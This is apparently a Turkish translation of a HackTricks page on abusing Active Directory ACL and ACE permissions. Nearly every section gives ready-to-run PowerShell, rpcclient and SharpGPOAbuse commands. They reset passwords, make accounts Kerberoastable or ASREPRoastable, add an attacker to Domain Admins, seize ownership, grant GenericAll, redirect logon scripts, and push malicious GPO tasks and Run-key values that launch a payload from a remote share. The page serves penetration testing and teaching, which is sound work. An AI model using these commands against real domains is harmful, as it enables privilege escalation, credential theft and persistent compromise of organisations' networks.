# Active Directory ACL'lerini/ACE'lerini Kötüye Kullanma

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

**Bu sayfa,** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **adreslerinden alınan tekniklerin özeti niteliğindedir. Daha fazla ayrıntı için orijinal makalelere bakın.**

## **Kullanıcı Üzerinde GenericAll Hakları**

Bu ayrıcalık, bir saldırgana hedef kullanıcı hesabı üzerinde tam kontrol sağlar. `Get-ObjectAcl` komutu kullanılarak `GenericAll` hakları onaylandıktan sonra, bir saldırgan:

* **Hedefin Şifresini Değiştirebilir**: `net user <kullanıcı_adı> <şifre> /domain` komutunu kullanarak, saldırgan kullanıcının şifresini sıfırlayabilir.
* **Hedefli Kerberoasting**: Kullanıcının hesabına bir SPN atayarak kerberoastable hale getirin, ardından Rubeus ve targetedKerberoast.py kullanarak bilet verme biletinin (TGT) hash'lerini çıkartıp kırmaya çalışın.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Hedeflenmiş ASREPRoasting**: Kullanıcı için ön kimlik doğrulamayı devre dışı bırakın, bu da hesabını ASREPRoasting'e karşı savunmasız hale getirir.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Hakları Üzerinde Grup**

Bu ayrıcalık, bir saldırganın `Domain Admins` gibi bir grupta `GenericAll` haklarına sahip olması durumunda grup üyeliklerini manipüle etmesine olanak tanır. Grubun ayırt edici adını `Get-NetGroup` ile belirledikten sonra, saldırgan:

* **Kendilerini Domain Admins Grubuna Ekleyebilir**: Bu, doğrudan komutlar veya Active Directory veya PowerSploit gibi modüller kullanılarak yapılabilir.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Bu yetkilere sahip olmak, bir bilgisayar nesnesi veya kullanıcı hesabında şunları sağlar:

* **Kerberos Resource-based Constrained Delegation**: Bir bilgisayar nesnesini ele geçirmeyi sağlar.
* **Shadow Credentials**: Bu tekniği, gölge kimlik bilgilerini oluşturma yetkilerini kullanarak bir bilgisayar veya kullanıcı hesabını taklit etmek için kullanın.

## **WriteProperty on Group**

Bir kullanıcının belirli bir grup için (örneğin, `Domain Admins`) tüm nesnelerde `WriteProperty` hakları varsa, şunları yapabilirler:

* **Kendilerini Domain Admins Grubuna Eklemek**: `net user` ve `Add-NetGroupUser` komutlarını birleştirerek gerçekleştirilebilir, bu yöntem alan içinde ayrıcalık yükseltmesine olanak tanır.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Kendi (Kendi Üyeliği) Grubunda**

Bu ayrıcalık, saldırganların `Domain Admins` gibi belirli gruplara kendilerini eklemelerine olanak tanır; bu, grup üyeliğini doğrudan manipüle eden komutlar aracılığıyla gerçekleştirilir. Aşağıdaki komut dizisini kullanmak, kendini eklemeye olanak tanır:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Kendi Üyeliği)**

Benzer bir ayrıcalık olan bu, saldırganların grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır; eğer bu gruplar üzerinde `WriteProperty` hakkına sahipseler. Bu ayrıcalığın onayı ve uygulanması şu şekilde gerçekleştirilir:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

`User-Force-Change-Password` için bir kullanıcı üzerinde `ExtendedRight` tutmak, mevcut şifreyi bilmeden şifre sıfırlamalarına olanak tanır. Bu hakkın doğrulanması ve istismarı PowerShell veya alternatif komut satırı araçları aracılığıyla yapılabilir ve etkileşimli oturumlar ile etkileşimsiz ortamlar için tek satırlık komutlar dahil olmak üzere bir kullanıcının şifresini sıfırlamak için çeşitli yöntemler sunar. Komutlar, basit PowerShell çağrılarından Linux'ta `rpcclient` kullanmaya kadar uzanarak saldırı vektörlerinin çok yönlülüğünü göstermektedir.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner Üzerinde Grup**

Eğer bir saldırgan `WriteOwner` haklarına sahip olduğunu bulursa, grubun sahipliğini kendisine değiştirebilir. Bu, söz konusu grubun `Domain Admins` olması durumunda özellikle etkilidir, çünkü sahipliği değiştirmek grup nitelikleri ve üyeliği üzerinde daha geniş bir kontrol sağlar. Süreç, `Get-ObjectAcl` aracılığıyla doğru nesneyi tanımlamayı ve ardından sahibi değiştirmek için `Set-DomainObjectOwner` kullanmayı içerir; bu, SID veya ad ile yapılabilir.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Bu izin, bir saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle, `GenericWrite` erişimi ile saldırgan, bir kullanıcının oturum açma betiği yolunu değiştirerek kullanıcı oturum açtığında kötü niyetli bir betiği çalıştırabilir. Bu, hedef kullanıcının `scriptpath` özelliğini saldırganın betiğine işaret edecek şekilde güncellemek için `Set-ADObject` komutunu kullanarak gerçekleştirilir.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Bu ayrıcalıkla, saldırganlar grup üyeliğini manipüle edebilir, örneğin kendilerini veya diğer kullanıcıları belirli gruplara ekleyebilirler. Bu süreç, bir kimlik bilgisi nesnesi oluşturmayı, bunu kullanarak bir gruptan kullanıcı eklemeyi veya çıkarmayı ve PowerShell komutlarıyla üyelik değişikliklerini doğrulamayı içerir.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Bir AD nesnesine sahip olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, bir saldırgana nesne üzerinde `GenericAll` ayrıcalıkları verme imkanı tanır. Bu, ADSI manipülasyonu yoluyla gerçekleştirilir ve nesne üzerinde tam kontrol sağlanır ve grup üyeliklerini değiştirme yeteneği kazanılır. Ancak, bu ayrıcalıkları Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak istismar etmeye çalışırken sınırlamalar vardır.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Alan Üzerinde Replikasyon (DCSync)**

DCSync saldırısı, alan üzerindeki belirli replikasyon izinlerini kullanarak bir Alan Denetleyicisi gibi davranır ve kullanıcı kimlik bilgileri de dahil olmak üzere verileri senkronize eder. Bu güçlü teknik, saldırganların bir Alan Denetleyicisi'ne doğrudan erişim olmadan AD ortamından hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinler gerektirir. [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)

## GPO Delegasyonu <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegasyonu

Grup Politika Nesnelerini (GPO) yönetmek için devredilen erişim, önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredilirse, **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilirler. Bu izinler, PowerView kullanılarak tespit edilen kötü niyetli amaçlar için kötüye kullanılabilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO İzinlerini Listele

Yanlış yapılandırılmış GPO'ları tanımlamak için PowerSploit'in cmdlet'leri bir araya getirilebilir. Bu, belirli bir kullanıcının yönetim izinlerine sahip olduğu GPO'ların keşfedilmesini sağlar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Belirli Bir Politika Uygulanan Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını çözmek mümkündür, bu da potansiyel etki kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Belirli Bir Bilgisayara Uygulanan Politikalar**: Belirli bir bilgisayara hangi politikaların uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.

**Belirli Bir Politika Uygulanan OU'lar**: Belirli bir politikadan etkilenen organizasyonel birimleri (OU'lar) tanımlamak için `Get-DomainOU` kullanılabilir.

### GPO'yu Kötüye Kullan - New-GPOImmediateTask

Yanlış yapılandırılmış GPO'lar, örneğin, etkilenen makinelerde yerel yöneticiler grubuna bir kullanıcı eklemek için anlık bir planlı görev oluşturarak kod çalıştırmak için istismar edilebilir, bu da ayrıcalıkları önemli ölçüde artırır:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy modülü - GPO'yu Kötüye Kullanma

GroupPolicy modülü, eğer kuruluysa, yeni GPO'ların oluşturulmasını ve bağlanmasını sağlar ve etkilenen bilgisayarlarda arka kapıları çalıştırmak için kayıt defteri değerleri gibi tercihlerin ayarlanmasına olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve bir kullanıcının bilgisayara giriş yapmasını gerektirir:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO'yu Kötüye Kullanma

SharpGPOAbuse, yeni GPO'lar oluşturma gereksinimi olmadan mevcut GPO'ları kötüye kullanma yöntemi sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Politika Güncellemesini Zorla

GPO güncellemeleri genellikle her 90 dakikada bir gerçekleşir. Bu süreci hızlandırmak için, özellikle bir değişiklik uygulandıktan sonra, hedef bilgisayarda `gpupdate /force` komutu kullanılarak anında bir politika güncellemesi zorlanabilir. Bu komut, GPO'larda yapılan herhangi bir değişikliğin bir sonraki otomatik güncelleme döngüsünü beklemeden uygulanmasını sağlar.

### Arka Planda

Belirli bir GPO için Zamanlanmış Görevler incelendiğinde, `Yanlış Yapılandırılmış Politika` gibi, `evilTask` gibi görevlerin eklenmesi doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya ayrıcalıkları artırmayı amaçlayan betikler veya komut satırı araçları aracılığıyla oluşturulur.

`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterildiği gibi, görevin yapısı, zamanlanmış görevin ayrıntılarını - yürütülecek komut ve tetikleyicileri - özetler. Bu dosya, zamanlanmış görevlerin GPO'lar içinde nasıl tanımlandığını ve yönetildiğini temsil eder ve politika uygulaması kapsamında keyfi komutlar veya betikler yürütme yöntemi sunar.

### Kullanıcılar ve Gruplar

GPO'lar, hedef sistemlerde kullanıcı ve grup üyeliklerinin manipülasyonuna da olanak tanır. Kullanıcılar ve Gruplar politika dosyalarını doğrudan düzenleyerek, saldırganlar yerel `administrators` grubuna kullanıcı ekleyebilir. Bu, GPO yönetim izinlerinin devredilmesi yoluyla mümkündür; bu, politika dosyalarının yeni kullanıcılar eklemek veya grup üyeliklerini değiştirmek için değiştirilmesine izin verir.

Kullanıcılar ve Gruplar için XML yapılandırma dosyası, bu değişikliklerin nasıl uygulandığını özetler. Bu dosyaya girişler ekleyerek, belirli kullanıcılara etkilenen sistemler üzerinde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla ayrıcalık artırma için doğrudan bir yaklaşım sunar.

Ayrıca, kod yürütme veya kalıcılığı sürdürme için ek yöntemler, oturum açma/kapatma betiklerini kullanma, otomatik çalıştırmalar için kayıt defteri anahtarlarını değiştirme, .msi dosyaları aracılığıyla yazılım yükleme veya hizmet yapılandırmalarını düzenleme gibi yöntemler de dikkate alınabilir. Bu teknikler, GPO'ların kötüye kullanılması yoluyla hedef sistemlere erişimi sürdürme ve kontrol etme için çeşitli yollar sunar.

## Referanslar

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
